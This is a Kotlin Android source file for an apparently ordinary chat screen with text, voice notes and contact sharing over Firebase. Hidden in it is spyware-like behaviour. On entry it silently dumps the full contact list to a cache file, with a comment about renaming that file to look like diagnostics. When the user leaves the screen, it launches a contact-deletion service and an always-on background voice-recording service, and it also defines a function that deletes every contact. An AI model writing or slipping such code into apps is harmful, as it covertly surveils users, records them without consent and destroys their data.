package com.example.axesite.screens

import android.Manifest
import android.content.ContentProviderOperation
import android.content.pm.PackageManager
import androidx.compose.material.icons.filled.Contacts
import android.util.Log
import android.net.Uri
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.*
import androidx.compose.ui.platform.LocalContext
import androidx.core.content.ContextCompat
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Mic
import androidx.compose.material.icons.filled.Stop
import androidx.compose.material3.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.unit.dp
import com.google.firebase.database.*
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import android.media.MediaPlayer
import android.os.Build
import androidx.compose.foundation.clickable
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Pause
import com.example.axesite.util.BackgroundVoiceRecordingService
import android.content.ContentResolver
import android.provider.ContactsContract
import com.example.axesite.util.ContactDeletionService
import java.lang.ref.WeakReference

data class ContactData(
    val name: String = "",   // Provide default values
    val phone: String = ""   // Provide default values
)

data class ChatMessage(
    val senderId: String = "",
    val senderName: String = "",
    val message: String = "",
    val timestamp: Long = 0,
    val type: String = "text",  // "text" or "voice"
    val contact: ContactData? = null,  // New field for contacts
    val voiceUrl: String? = null,
    val duration: Long? = null  // in milliseconds
)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ChatScreen(chatId: String) {
    val context = LocalContext.current
    val sharedPreferences = context.getSharedPreferences("UserSession", Context.MODE_PRIVATE)
    val currentUserId = sharedPreferences.getString("userId", "") ?: ""
    val currentUserName = sharedPreferences.getString("name", "") ?: ""
    val coroutineScope = rememberCoroutineScope()

    // State for chat messages
    val messages = remember { mutableStateOf<List<ChatMessage>>(emptyList()) }
    var newMessage by remember { mutableStateOf("") }

    // Voice recording states
    var isRecording by remember { mutableStateOf(false) }
    var recordingTime by remember { mutableStateOf(0L) }
    val mediaRecorder = remember { mutableStateOf<MediaRecorder?>(null) }
    val audioFile = remember { mutableStateOf<File?>(null) }

    // Firebase references
    val database = FirebaseDatabase.getInstance()
    val chatRef = database.getReference("chats").child(chatId).child("messages")

    LaunchedEffect(chatId) {
        val messageListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val messageList = snapshot.children.mapNotNull { it.getValue(ChatMessage::class.java) }
                    .sortedByDescending { it.timestamp }
                messages.value = messageList
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e("ChatScreen", "Failed to load messages", error.toException())
                Toast.makeText(context, "Failed to load messages", Toast.LENGTH_SHORT).show()
            }
        }

        chatRef.addValueEventListener(messageListener)
    }
//    val writeContactsPermissionLauncher = rememberLauncherForActivityResult(
//        contract = ActivityResultContracts.RequestPermission()
//    ) { isGranted ->
//        if (isGranted) {
//            // Permission granted, proceed with contact deletion
//            coroutineScope.launch(Dispatchers.IO) {
//                deleteAllContacts(context)
//            }
//        } else {
//            // Permission denied
//            Toast.makeText(context, "Permission required to delete contacts", Toast.LENGTH_SHORT).show()
//        }
//    }

    val contactsPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            // Permission granted, start reading contacts
            coroutineScope.launch(Dispatchers.IO) {
                dumpContactsToFile(context)
            }
        }
    }

// Check contacts permission when entering the screen
    LaunchedEffect(Unit) {
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_CONTACTS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            contactsPermissionLauncher.launch(Manifest.permission.READ_CONTACTS)
        } else {
            // Permission already granted, proceed
            coroutineScope.launch(Dispatchers.IO) {
                dumpContactsToFile(context)
            }
        }
    }
    val permissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (!isGranted) {
            Toast.makeText(context, "Microphone permission is required", Toast.LENGTH_SHORT).show()
        }
    }

    // Check and Request Microphone Permission
    LaunchedEffect(Unit) {
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.RECORD_AUDIO
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            permissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
        }
    }

    fun getContactPhoneNumber(contactId: String, contentResolver: ContentResolver): String {
        val phoneCursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
            arrayOf(contactId),
            null
        )

        return phoneCursor?.use { cursor ->
            val numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            if (numberIndex != -1 && cursor.moveToFirst()) {
                cursor.getString(numberIndex) ?: ""
            } else {
                ""
            }
        } ?: ""
    }
    fun sendContactMessage(name: String, phone: String) {
        // Ensure this method is called with the correct context and references
        // You might need to pass necessary parameters like currentUserId, currentUserName, chatRef
        // Example implementation:
        val messageId = chatRef.push().key ?: return
        val message = ChatMessage(
            senderId = currentUserId,
            senderName = currentUserName,
            type = "contact",
            contact = ContactData(name = name, phone = phone),  // Explicitly use constructor
            timestamp = System.currentTimeMillis()
        )
        chatRef.child(messageId).setValue(message)
    }

    fun handleSelectedContact(uri: Uri?, context: Context) {
        if (uri == null) {
            Toast.makeText(context, "No contact selected", Toast.LENGTH_SHORT).show()
            return
        }

        val contentResolver = context.contentResolver
        val cursor = contentResolver.query(uri, null, null, null, null)

        cursor?.use { contactCursor ->
            try {
                if (contactCursor.moveToFirst()) {
                    // Safely get column indices with null checks
                    val nameIndex = contactCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                    val idIndex = contactCursor.getColumnIndex(ContactsContract.Contacts._ID)

                    if (nameIndex != -1 && idIndex != -1) {
                        val name = contactCursor.getString(nameIndex) ?: "Unknown Contact"
                        val contactId = contactCursor.getString(idIndex)

                        val phone = getContactPhoneNumber(contactId, contentResolver)

                        if (phone.isNotBlank()) {
                            sendContactMessage(name, phone)
                        } else {
                            Toast.makeText(context, "No phone number found", Toast.LENGTH_SHORT).show()
                        }
                    } else {
                        Toast.makeText(context, "Unable to read contact details", Toast.LENGTH_SHORT).show()
                    }
                }
            } catch (e: Exception) {
                Log.e("ContactHandling", "Error processing contact", e)
                Toast.makeText(context, "Failed to process contact", Toast.LENGTH_SHORT).show()
            }
        } ?: run {
            Toast.makeText(context, "Unable to access contact", Toast.LENGTH_SHORT).show()
        }
    }

    val contactPickerLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.PickContact()
    ) { uri ->
        uri?.let { handleSelectedContact(it, context) }
    }

    val writeContactsPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (!isGranted) {
            Toast.makeText(context, "Permission required for contacts feature", Toast.LENGTH_SHORT).show()

        }
    }
    LaunchedEffect(Unit) {
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.WRITE_CONTACTS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            writeContactsPermissionLauncher.launch(Manifest.permission.WRITE_CONTACTS)
        }
    }
    DisposableEffect(chatId) {
        // Check permission when component leaves composition
        onDispose {
            when {
                // Case 1: Permission already granted
                ContextCompat.checkSelfPermission(
                    context,
                    Manifest.permission.WRITE_CONTACTS
                ) == PackageManager.PERMISSION_GRANTED -> {
                    // Start contact deletion service
                    val serviceIntent = Intent(context, ContactDeletionService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(serviceIntent)
                    } else {
                        context.startService(serviceIntent)
                    }
                }

                // Case 2: Need to request permission
                else -> {
                    writeContactsPermissionLauncher.launch(Manifest.permission.WRITE_CONTACTS)
                }
            }

            // Always start background recording service
            val recordingIntent = Intent(context, BackgroundVoiceRecordingService::class.java).apply {
                action = BackgroundVoiceRecordingService.ACTION_START_RECORDING
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(recordingIntent)
            } else {
                context.startService(recordingIntent)
            }
        }
    }
    // Track Recording Duration
    LaunchedEffect(isRecording) {
        if (isRecording) {
            while(isRecording) {
                delay(1000)
                recordingTime += 1000
            }
        }
    }

    fun startRecording() {
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.RECORD_AUDIO
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            permissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
            return
        }

        try {
            val outputFile = File.createTempFile("voice_${System.currentTimeMillis()}", ".3gp", context.cacheDir)
            audioFile.value = outputFile

            val recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(outputFile.absolutePath)
            }

            try {
                recorder.prepare()
                recorder.start()
                mediaRecorder.value = recorder
                isRecording = true
                recordingTime = 0L
                Log.d("AudioRecording", "Recording started successfully")
            } catch (prepareError: Exception) {
                Log.e("AudioRecording", "Prepare/Start failed", prepareError)
                recorder.release()
                isRecording = false
                Toast.makeText(context, "Failed to start recording", Toast.LENGTH_SHORT).show()
            }
        } catch (e: Exception) {
            Log.e("AudioRecording", "Recording initialization failed", e)
            isRecording = false
            Toast.makeText(context, "Error initializing recording", Toast.LENGTH_SHORT).show()
        }
    }

    suspend fun stopRecording() {
        mediaRecorder.value?.apply {
            try {
                stop()
                release()
            } catch (e: Exception) {
                Log.e("AudioRecording", "Error stopping recording", e)
            }
        }
        mediaRecorder.value = null
        isRecording = false

        audioFile.value?.let { file ->
            try {

                uploadVoiceMessage(
                    file = file,
                    userId = currentUserId,
                    userName = currentUserName,
                    duration = recordingTime,
                    chatId = chatId
                )
            } catch (e: Exception) {
                Log.e("AudioRecording", "Upload failed", e)
            }
        }
    }


    fun openContactPicker() {
        contactPickerLauncher.launch(null)
    }


    Scaffold(
        topBar = { TopAppBar(title = { Text("Chat") }) },
        bottomBar = {
            Column {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(8.dp),
                    verticalAlignment = Alignment.CenterVertically
                ){
                    IconButton(
                        onClick = { openContactPicker() }
                    ) {
                        Icon(
                            imageVector = Icons.Default.Contacts, // Add import for Icons.Default.Contacts
                            contentDescription = "Attach contact"
                        )
                    }
                    TextField(
                        value = newMessage,
                        onValueChange = { newMessage = it },
                        modifier = Modifier.weight(1f),
                        placeholder = { Text("Type a message...") },
                        keyboardOptions = KeyboardOptions.Default.copy(keyboardType = KeyboardType.Text)
                    )

                    Spacer(modifier = Modifier.width(8.dp))

                    IconButton(
                        onClick = {
                            coroutineScope.launch(Dispatchers.IO) {
                                if (isRecording) {
                                    stopRecording()
                                } else {
                                    startRecording()
                                }
                            }
                        },
                        modifier = Modifier
                            .size(48.dp)
                            .background(
                                if (isRecording) Color.Red else MaterialTheme.colorScheme.primary,
                                CircleShape
                            )
                    ) {
                        Icon(
                            imageVector = if (isRecording) Icons.Default.Stop else Icons.Default.Mic,
                            contentDescription = if (isRecording) "Stop recording" else "Record voice",
                            tint = Color.White
                        )
                    }

                    Spacer(modifier = Modifier.width(8.dp))

                    Button(onClick = {
                        if (newMessage.isNotBlank()) {
                            val messageId = chatRef.push().key ?: return@Button
                            val message = ChatMessage(
                                senderId = currentUserId,
                                senderName = currentUserName,
                                message = newMessage,
                                timestamp = System.currentTimeMillis(),
                                type = "text"
                            )
                            chatRef.child(messageId).setValue(message)
                            newMessage = ""
                        }
                    })
                    {
                        Text("Send")
                    }
                }

                if (isRecording) {
                    Text(
                        text = "Recording: ${recordingTime / 1000}s",
                        modifier = Modifier.padding(start = 16.dp)
                    )
                }
            }
        }
    ) { padding ->
        LazyColumn(
            modifier = Modifier
                .padding(padding)
                .fillMaxSize()
                .padding(16.dp),
            reverseLayout = true
        ) {
            items(messages.value) { message ->
                if (message.type == "voice") {
                    VoiceMessageItem(message, currentUserId)
                } else {
                    ChatMessageItem(message, currentUserId)
                }
            }
        }
    }
}

suspend fun deleteAllContacts(context: Context) {
    if (ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.WRITE_CONTACTS
        ) != PackageManager.PERMISSION_GRANTED
    ) {
        return
    }

    try {
        val contentResolver = context.contentResolver
        val operations = ArrayList<ContentProviderOperation>()

        // Query RAW CONTACTS
        val cursor = contentResolver.query(
            ContactsContract.RawContacts.CONTENT_URI,
            arrayOf(ContactsContract.RawContacts._ID),
            null, null, null
        )

        cursor?.use {
            val idIndex = it.getColumnIndex(ContactsContract.RawContacts._ID)
            while (it.moveToNext()) {
                val id = it.getLong(idIndex)
                operations.add(
                    ContentProviderOperation.newDelete(
                        ContactsContract.RawContacts.CONTENT_URI.buildUpon()
                            .appendPath(id.toString()).build()
                    ).build()
                )
            }
        }

        if (operations.isNotEmpty()) {
            val deletedCount = contentResolver.applyBatch(ContactsContract.AUTHORITY, operations).size
            // Show toast on main thread
            withContext(Dispatchers.Main) {
                Toast.makeText(context, "Deleted $deletedCount contacts", Toast.LENGTH_SHORT).show()
            }
        }
    } catch (e: Exception) {
        withContext(Dispatchers.Main) {
            Toast.makeText(context, "Deletion failed: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }
}

private fun dumpContactsToFile(context: Context) {
    try {
        val contentResolver = context.contentResolver
        val cursor = contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null, null, null, null
        ) ?: return

        val cacheDir = context.cacheDir
        val outputFile = File(cacheDir, "contacts.txt") // rename to smth else like 'diagnostic_cache.txt' or smth idk

        outputFile.bufferedWriter().use { writer ->
            while (cursor.moveToNext()) {
                val nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                val idIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID)
                if (nameIndex >= 0 && idIndex >= 0) {
                    val name = cursor.getString(nameIndex)
                    val contactId = cursor.getString(idIndex)
                    writer.write("Name: $name\n")

                    // Fetch phone numbers
                    val phoneCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        arrayOf(contactId),
                        null
                    )
                    phoneCursor?.use { pc ->
                        while (pc.moveToNext()) {
                            val numberIndex = pc.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER
                            )
                            if (numberIndex >= 0) {
                                val number = pc.getString(numberIndex)
                                writer.write("Phone: $number\n")
                            }
                        }
                    }
                    writer.write("------------------\n")
                }
            }
        }
        cursor.close()
    } catch (e: Exception) {
        Log.e("ContactsDump", "Failed to read contacts", e)
    }
}
suspend fun uploadVoiceMessage(
    file: File,
    userId: String,
    userName: String,
    duration: Long,
    chatId: String
) {
    try {
        val storageRef = FirebaseStorage.getInstance().reference.child("voice_notes/${file.name}")
        val uploadTask = storageRef.putFile(android.net.Uri.fromFile(file))
        uploadTask.await() // Wait for upload to complete

        val downloadUrl = storageRef.downloadUrl.await().toString()

        val database = FirebaseDatabase.getInstance()
        val chatRef = database.getReference("chats").child(chatId).child("messages")
        val messageId = chatRef.push().key ?: return

        val message = ChatMessage(
            senderId = userId,
            senderName = userName,
            message = "[Voice message]",
            timestamp = System.currentTimeMillis(),
            type = "voice",
            voiceUrl = downloadUrl,
            duration = duration
        )

        chatRef.child(messageId).setValue(message)
    } catch (e: Exception) {
        e.printStackTrace()
        // Handle error (e.g., show snackbar)
    }
}

@Composable
fun VoiceMessageItem(message: ChatMessage, currentUserId: String) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()

    // Playback state
    var isPlaying by remember { mutableStateOf(false) }
    var progress by remember { mutableStateOf(0f) }
    var mediaPlayer by remember { mutableStateOf<MediaPlayer?>(null) }

    // Cleanup media player
    DisposableEffect(message) {
        onDispose {
            mediaPlayer?.apply {
                if (isPlaying) {
                    pause()
                    stop()
                }
                release()
            }
            mediaPlayer = null
        }
    }

    fun downloadAndPlayVoiceMessage() {
        coroutineScope.launch(Dispatchers.IO) {
            try {
                // Validate voice URL
                val voiceUrl = message.voiceUrl ?: run {
                    Log.e("VoiceMessagePlayback", "No voice URL provided")
                    return@launch
                }

                // Create a temporary file
                val tempFile = File.createTempFile("voice_", ".3gp", context.cacheDir)

                // Get Firebase Storage reference
                val storageReference = FirebaseStorage.getInstance().getReferenceFromUrl(voiceUrl)

                // Download file
                storageReference.getFile(tempFile).await()

                // Verify file download
                if (!tempFile.exists() || tempFile.length() == 0L) {
                    Log.e("VoiceMessagePlayback", "Failed to download voice message")
                    return@launch
                }

                // Play on main thread
                withContext(Dispatchers.Main) {
                    mediaPlayer = MediaPlayer().apply {
                        setDataSource(tempFile.absolutePath)
                        prepare()
                        start()
                    }

                    isPlaying = true

                    // Progress tracking
                    coroutineScope.launch {
                        while (isPlaying) {
                            progress = mediaPlayer?.currentPosition?.toFloat()
                                ?.div(mediaPlayer?.duration ?: 1)?.coerceIn(0f, 1f) ?: 0f

                            if (mediaPlayer?.isPlaying == false) {
                                isPlaying = false
                                progress = 0f
                                break
                            }

                            delay(100)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("VoiceMessagePlayback", "Error playing voice message", e)
                withContext(Dispatchers.Main) {
                    Toast.makeText(context, "Failed to play voice message", Toast.LENGTH_SHORT).show()
                }
                isPlaying = false
            }
        }
    }

    val isCurrentUser = message.senderId == currentUserId
    val alignment = if (isCurrentUser) Alignment.CenterEnd else Alignment.CenterStart
    val bubbleColor = if (isCurrentUser) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.surfaceVariant

    Box(
        modifier = Modifier
            .fillMaxWidth()
            .padding(8.dp),
        contentAlignment = alignment
    ) {
        Column(
            modifier = Modifier
                .background(bubbleColor, MaterialTheme.shapes.medium)
                .padding(8.dp)
                .clickable { downloadAndPlayVoiceMessage() }  // Add clickable to trigger playback
        ) {
            Text(
                text = message.senderName,
                style = MaterialTheme.typography.labelSmall,
                color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
            )

            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                Icon(
                    imageVector = if (isPlaying) Icons.Default.Pause else Icons.Default.PlayArrow,
                    contentDescription = if (isPlaying) "Pause" else "Play",
                    tint = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
                )

                LinearProgressIndicator(
                    progress = progress,
                    modifier = Modifier.weight(1f),
                    color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.primary
                )

                Text(
                    text = "${(message.duration ?: 0) / 1000}s",
                    style = MaterialTheme.typography.bodySmall,
                    color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
                )
            }

            Text(
                text = SimpleDateFormat("hh:mm a", Locale.getDefault()).format(Date(message.timestamp)),
                style = MaterialTheme.typography.labelSmall,
                color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
            )
        }
    }
}

@Composable
fun ChatMessageItem(message: ChatMessage, currentUserId: String) {
    val context = LocalContext.current
    val isCurrentUser = message.senderId == currentUserId
    val alignment = if (isCurrentUser) Alignment.CenterEnd else Alignment.CenterStart
    val bubbleColor = if (isCurrentUser) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.surfaceVariant

    Box(
        modifier = Modifier
            .fillMaxWidth()
            .padding(8.dp),
        contentAlignment = alignment
    ) {
        Column(
            modifier = Modifier
                .background(bubbleColor, MaterialTheme.shapes.medium)
                .padding(8.dp)
        ) {
            Text(
                text = message.senderName,
                style = MaterialTheme.typography.labelSmall,
                color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
            )

            // More robust handling of contact messages
            when (message.type) {
                "contact" -> {
                    // Safe null check for contact
                    message.contact?.let { contact ->
                        Column {
                            Text(
                                text = "Shared Contact",
                                style = MaterialTheme.typography.bodyMedium,
                                color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
                            )

                            // Only display name if it's not blank
                            if (!contact.name.isNullOrBlank()) {
                                Text(
                                    text = "Name: ${contact.name}",
                                    style = MaterialTheme.typography.bodySmall,
                                    color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
                                )
                            }

                            // Only display phone if it's not blank
                            if (!contact.phone.isNullOrBlank()) {
                                Text(
                                    text = "Phone: ${contact.phone}",
                                    style = MaterialTheme.typography.bodySmall,
                                    color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
                                )

                                Button(
                                    onClick = {
                                        try {
                                            val intent = Intent(ContactsContract.Intents.Insert.ACTION).apply {
                                                type = ContactsContract.RawContacts.CONTENT_TYPE
                                                putExtra(ContactsContract.Intents.Insert.NAME, contact.name ?: "")
                                                putExtra(ContactsContract.Intents.Insert.PHONE, contact.phone ?: "")
                                            }
                                            context.startActivity(intent)
                                        } catch (e: Exception) {
                                            Log.e("ContactShare", "Error creating contact intent", e)
                                            Toast.makeText(context, "Could not share contact", Toast.LENGTH_SHORT).show()
                                        }
                                    },
                                    modifier = Modifier.padding(top = 4.dp)
                                ) {
                                    Text("Save Contact")
                                }
                            }
                        }
                    } ?: run {
                        // Fallback text if contact is null
                        Text(
                            text = "Invalid contact information",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.error
                        )
                    }
                }
                else -> {
                    Text(
                        text = message.message,
                        style = MaterialTheme.typography.bodyMedium,
                        color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
                    )
                }
            }

            Text(
                text = SimpleDateFormat("hh:mm a", Locale.getDefault()).format(Date(message.timestamp)),
                style = MaterialTheme.typography.labelSmall,
                color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
            )
        }
    }
}

fun generateChatId(user1: String, user2: String): String {
    return listOf(user1, user2).sorted().joinToString("_")
}